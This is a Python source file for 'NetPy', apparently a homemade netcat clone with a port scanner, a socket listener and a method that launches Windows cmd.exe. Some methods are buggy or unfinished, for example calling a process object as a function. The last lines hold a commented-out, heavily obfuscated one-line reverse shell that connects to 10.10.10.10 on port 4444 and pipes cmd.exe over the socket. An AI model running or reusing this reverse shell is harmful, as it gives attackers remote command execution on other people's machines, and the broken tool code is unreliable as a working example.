import socket
import subprocess
import sys
import threading
import time

import tty


class NetPy(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.port = 0
        self.ports = []
        self.ip = "0.0.0.0"
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.BUFFER_SIZE = 1024
        self.process = None
        pass

    def set_port(self, ports: int):
        self.port_start = 0
        self.port_end = 0

        if "-" in ports:
            self.port_start, self.port_end = ports.split("-")
            self.port_start = int(self.port_start)
            self.port_end = int(self.port_end)

        else:
            self.port_start = int(ports)
            self.port_end = int(ports)

    def set_ip(self, ip: str):
        self.ip = ip

    def set_timeout(self, timeout: bool):
        self.timeout = timeout

    def set_verbose(self, verbose: bool):
        self.verbose = verbose

    def set_udp(self, udp: bool):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    def set_prog(self):
        self.process = subprocess.Popen(['C:\\Windows\\system32\\cmd.exe'])

    def _scan(self):
        for port in range(self.port_start, self.port_end):
            result = self.socket.connect_ex((self.ip, port))
            if result == 0:
                print('port {} is open'.format(port))
            else:
                print('port {} is closed'.format(port))

    def scan(self):
        self._scan()

    def listen(self):
        self.socket.bind((self.ip, self.port_start))
        self.socket.listen(1)
        print('listening on {}:{}'.format(self.ip, self.port_start))

        conn, _ = self.socket.accept()

        while 1:
            data = conn.recv(1024)

            if not data:
                break

            print("recived:", self.s(data))

            if self.prog:
                self.process()

            msg = input("send: ")
            if msg == "q":
                break

            conn.send(self.p(msg).encode())
        conn.close()

    def readlines(self, process):
        while process.poll() is None:
            time.sleep(1)
            sys.stdout.write(process.stdout.readline().decode())

    def connect(self):
        # self.socket.connect((self.ip,  self.port_start))
        print('connected to {}:{}'.format(self.ip, self.port_start))
        process = subprocess.Popen(['C:\\Windows\\system32\\cmd.exe', ''],
                                   stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        # print('connected to {}:{}'.format(self.ip, self.port_start))

        print(process.stdout.readline().decode())

        # while 1:
        #     msg = input("send: ")
        #     if msg == "q":
        #         break

        #     self.socket.send(self.p(msg).encode())
        #     data = self.socket.recv(1024)
        #     process.stdin.write(self.p(msg).encode())
        #     process.stdin.flush()
        #     self.readlines(process)
        #     print("recived:", self.s(data))

        # print('disconnected from {}:{}'.format(self.ip, self.port_start))

        # self.socket.send(process.stdout.readlines())

        # while 1:
        #     msg = input("send: ")

        #     if msg == "q":
        #         break

        #     self.socket.send(self.p(msg).encode())

        #     data = self.socket.recv(self.BUFFER_SIZE)
        #     print("recived:", self.s(data))

        # self.socket.close()

    def p(self, msg: str) -> str:
        return msg + " " * (self.BUFFER_SIZE - len(msg))

    def s(self, msg: bytes) -> str:
        return msg.decode("utf-8").strip()

    def __str__(self):
        return 'netcat({}:{})'.format(self.ip, self.port_start)

    def __repr__(self):
        return '<{}>'.format(self)

    def run(self):
        pass


# lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.10.10.10', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[
#     1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib')
